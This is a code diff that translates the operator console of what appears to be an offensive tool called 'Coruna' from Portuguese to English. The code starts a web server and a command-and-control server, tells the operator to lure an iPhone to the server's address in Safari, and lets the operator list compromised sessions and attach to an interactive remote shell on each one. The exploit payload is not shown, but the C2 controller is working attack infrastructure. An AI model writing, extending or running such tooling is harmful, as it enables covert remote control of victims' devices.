@@ -33,13 +33,13 @@ async def main():
     await web_server.start(config)
     c2_task = asyncio.create_task(c2_server.start())
 
-    print("\n[*] Coruna rodando. Acesse http://IP_DA_VPS/ no iPhone (Safari)")
-    print("[*] Comandos: list | use <id> | help | quit\n")
+    print("\n[*] Coruna running. Open http://<SERVER_IP>/ in Safari on your iPhone")
+    print("[*] Commands: list | use <id> | help | quit\n")
 
     shutdown_event = asyncio.Event()
 
     def _signal_handler():
-        print("\n[*] Sinal de término recebido. Encerrando...")
+        print("\n[*] Shutdown signal received. Stopping servers...")
         shutdown_event.set()
 
     loop = asyncio.get_running_loop()
@@ -50,20 +50,20 @@ async def main():
             pass
 
     async def run_shell(session):
-        """Modo interativo de shell para uma sessão."""
-        print(f"\n[*] Conectado a {session.ip_address} (sessão {session.id}). Digite 'exit' ou 'back' para voltar.\n")
+        """Interactive shell mode for a session."""
+        print(f"\n[*] Connected to {session.ip_address} (session {session.id}). Type 'exit' or 'back' to return.\n")
         while not shutdown_event.is_set():
             try:
                 cmd = await loop.run_in_executor(None, lambda: input("(shell)> ").strip())
             except (EOFError, KeyboardInterrupt):
                 break
             if cmd in ("exit", "back", "quit"):
-                print("[*] Voltando ao menu principal.")
+                print("[*] Returning to main menu.")
                 break
             if not cmd:
                 continue
             if session.id not in c2_server.active_sessions:
-                print("[-] Sessão encerrada.")
+                print("[-] Session terminated.")
                 break
             try:
                 session.output_buffer.clear()
@@ -74,13 +74,13 @@ async def main():
                     if out:
                         print(out, end="", flush=True)
             except Exception as e:
-                print(f"[-] Erro: {e}")
+                print(f"[-] Error: {e}")
                 break
 
     is_headless = os.environ.get("CORUNA_HEADLESS") in ("1", "true", "yes") or not sys.stdin.isatty()
     if is_headless:
-        print("[*] Modo daemon/não-interativo ativo. Web server e C2 aguardando conexões...")
-        print("[*] Pressione Ctrl+C ou envie SIGTERM para parar.\n")
+        print("[*] Daemon / non-interactive mode active. Web server and C2 waiting for connections...")
+        print("[*] Press Ctrl+C or send SIGTERM to stop.\n")
         try:
             await shutdown_event.wait()
         except (asyncio.CancelledError, KeyboardInterrupt):
@@ -94,15 +94,15 @@ async def main():
             if cmd in ("quit", "exit"):
                 break
             if cmd in ("help", "h", "?"):
-                print("  list       lista sessões ativas (IDs)")
-                print("  use <id>   entra na shell da sessão (ex: use abc12345)")
-                print("  quit       encerra o servidor")
+                print("  list       List active sessions (IDs)")
+                print("  use <id>   Attach to session shell (e.g., use abc12345)")
+                print("  quit       Stop server and exit")
                 continue
             if cmd in ("list", "ls", "sessions"):
                 for s in c2_server.get_sessions_summary():
                     print(f"  [{s['id']}] {s['ip_address']} {s['connected_at']}")
                 if not c2_server.get_sessions_summary():
-                    print("  (nenhuma sessão)")
+                    print("  (no active sessions)")
             elif cmd.startswith("use "):
                 parts = cmd.split(maxsplit=1)
                 sid = parts[1] if len(parts) > 1 else ""
@@ -110,7 +110,7 @@ async def main():
                 if session:
                     await run_shell(session)
                 else:
-                    print(f"[-] Sessão '{sid}' não encontrada. Use 'list' para ver IDs.")
+                    print(f"[-] Session '{sid}' not found. Use 'list' to see IDs.")
 
     c2_task.cancel()
     try:
@@ -119,7 +119,7 @@ async def main():
         pass
     c2_server.stop()
     await web_server.stop()
-    print("[*] Servidores finalizados com sucesso.")
+    print("[*] Servers shut down successfully.")
 
 
 if __name__ == "__main__":
